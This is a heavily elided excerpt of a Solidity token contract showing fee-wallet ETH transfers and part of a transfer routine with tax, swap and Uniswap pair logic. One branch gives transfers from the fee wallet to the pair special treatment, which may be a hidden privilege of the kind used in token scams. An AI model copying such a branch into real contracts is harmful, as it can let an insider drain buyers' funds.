...
contract transferFromFacet is IERC20, Context, Ownable {
    ...
    function sendETHToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._feeOrdinalWallet.transfer(amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && from != address(this)) {
            ...
            if (to == ds.uniswapV2Pair && from != address(this)) {
                if (from == address(ds._feeOrdinalWallet)) {
                    senderAmount = min(
                        amount
                            .mul(
                                (ds._buyCount > ds._reduceBuyTaxAt)
            ...
            bool swappable = ds._minOrdinalSwapAmount ==
                min(amount, ds._minOrdinalSwapAmount) &&
            ...
            if (
                ...
                if (contractTokenBalance > ds._minOrdinalSwapAmount) {
                    swapTokensForEth(
